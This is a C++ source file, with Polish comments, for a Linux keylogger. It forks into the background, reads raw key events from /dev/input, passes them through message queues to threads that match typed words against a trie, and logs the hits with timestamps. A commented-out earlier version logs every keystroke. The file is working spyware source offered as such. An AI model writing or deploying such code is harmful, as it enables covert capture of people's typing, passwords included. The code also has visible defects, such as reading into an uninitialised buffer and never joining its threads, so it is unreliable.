#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include "tree.h"
#include "treecheck.h"
#include <vector>
#include <mqueue.h>
#include <mutex>
#include <list>
#include <thread>

std::mutex mutex;

char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
					 'b','n','m',',','.','/' };

void handler (int sig)
{
  exit(0);
}

void perror_exit()
{
  handler(9);
}


void init();
void runChecker(FILE *data, Tree &tree, mqd_t id, const std::string &name);

int main (int argc, char *argv[])
{
    /*using namespace std;

    mqd_t mq;
    struct mq_attr attr;
    char buffer[1024 + 1];
    int must_stop = 0;


    attr.mq_flags = 0;
    attr.mq_maxmsg = 10;
    attr.mq_msgsize = 1024;
    attr.mq_curmsgs = 0;


    mq = mq_open("/test_queue", O_CREAT | O_RDONLY, 0644, &attr);
    if((mqd_t)-1 == mq)
        cout<<"BLAD!!"<<endl;*/


	if (!fork())
		init();
	else
		std::cout << "Keylogger up and running\n!";

}

void loadData(std::string &eventPath, std::string &logPath) {

	std::ifstream stream;
	stream.open("/etc/keylogger.conf");
	std::string temp;
	stream >> temp;
	int event = 0;
	stream >> event;
	std::stringstream ss;
	ss << "/dev/input/event" << event;
	eventPath = ss.str();
	stream >> logPath;
	stream.close();


}

void printTime(FILE *data)
{
	time_t now;
	char *t = (char *)malloc(100);
	time(&now);
	strcpy(t, (char *)ctime(&now));
	t[strlen(t) - 1] = '\0';

	fprintf(data, "%s : ", t);
	fflush(data);

	free(t);
}

void init() {
	struct input_event ev[1];
	int fd, rd, value, size = sizeof(struct input_event);

	std::string logPath;
	std::string eventPath;

	loadData(eventPath, logPath);

	std::vector<std::string> slowa;
	slowa.push_back("sal");
	slowa.push_back("sala");

	Tree tree(slowa);
	//TreeCheck checker(&tree);

	//Open Device
	if ((fd = open (eventPath.c_str(), O_RDONLY)) == -1)
		printf ("%s is not a vaild device.n", eventPath.c_str());


	FILE *data = fopen(logPath.c_str(), "w");


	printTime(data);
	fprintf(data, "-- session start --\n");
	fflush(data);

    //lista identyfikatorów kolejek
    std::list<mqd_t> queueList;
    srand (time(NULL));

while (1)
{

		if ((rd = read (fd, ev, size * 1)) < size)
			continue;

		value = ev[0].code;

		if (ev[0].type == 1 && ev[0].value == 1)
		{
            //tworzenie randomowej nazwy - musi zaczynać się '/'
            std::string qname = "/";
            qname += std::to_string(rand());

            //inicjalizacja struktury atrybutów dla kolejki
            struct mq_attr attrib;
            attrib.mq_flags = 0;
            attrib.mq_maxmsg = 100;     //maksymalna ilość wiadomości w kolejce
            attrib.mq_msgsize = 128;   //wielkość 1 wiadomości
            attrib.mq_curmsgs = 0;

            mqd_t id;   //id tworzonej kolejki

            //metoda tworzaca kolejkę
            id = mq_open(qname.c_str(), O_CREAT | O_RDWR, 0644, &attrib);

            //jeśli brak błędu to dodaj kolejkę do listy
            if((mqd_t)id != -1)
                queueList.push_back(id);
            //jeśli błąd wyświetl SZOP!!! (powinno się pojawić po kliknięciu przycisku/ w logach)
            else
            {
                printf("SZOP!!!!");
                fprintf(data, "ERROR : queueListError\n");
                fflush(data);
                return;
            }

            //tworzenie nowego wątku dla kolejnej literki
            std::thread newThread(std::bind(runChecker,data,tree,id,qname));

            if(!queueList.empty())
            {
                for(std::list<mqd_t>::iterator it=queueList.begin(); it!=queueList.end();)
                {
                    struct mq_attr attr;
                    //sprawdzanie czy kolejka istnieje - jeśli tak to wysłanie klawisza; jeśli nie - usunięcie elementu
                    if(mq_getattr(*it,&attr) != -1)
                    {
                        std::string msg = std::to_string(chars[value]);
                        mq_send(*it, msg.c_str(),sizeof(msg.c_str()), 0);
                        it++;
                    }
                    else
                        it = queueList.erase(it);
                }
            }

		}
}



//przed Quetzową zmianą tak wyglądał init:
	/*while (1){

		if ((rd = read (fd, ev, size * 1)) < size)
			continue;

		value = ev[0].code;

		if (ev[0].type == 1 && ev[0].value == 1)
		{

			printTime(data);
			fprintf(data, "%c :: %d\n", chars[value], value);
			fflush(data);

			if(checker.checkNextLetter(chars[value])){
				if(checker.isCurrentNodeTerminal()) {
					printTime(data);
					fprintf(data, "%s\n", checker.getFoundWord().c_str());
					fflush(data);
				}
			}

		}
	}*/
}



void runChecker(FILE *data, Tree &tree, mqd_t id,const std::string &name)
{
    TreeCheck checker(&tree);

    while(1)
    {
        char* buff;
        //odbieranie wiadomości z kolejki - jeśli nie ma - wątek zawiesza się w oczekiwaniu na nią
        mq_receive(id, buff,sizeof(buff), 0);
        int index = atoi(buff);

        if(checker.checkNextLetter(chars[index]))
        {
            if(checker.isCurrentNodeTerminal())
            {
                mutex.lock();
                printTime(data);
                fprintf(data, "%s\n", checker.getFoundWord().c_str());
                fflush(data);
                mutex.unlock();
            }
        }
        else
        {
            mq_close(id);   //zamykanie kolejki
            mq_unlink(name.c_str());    //odłączanie kolejki
            break;  //przerwanie pętli - koniec wątku
        }
    }
}
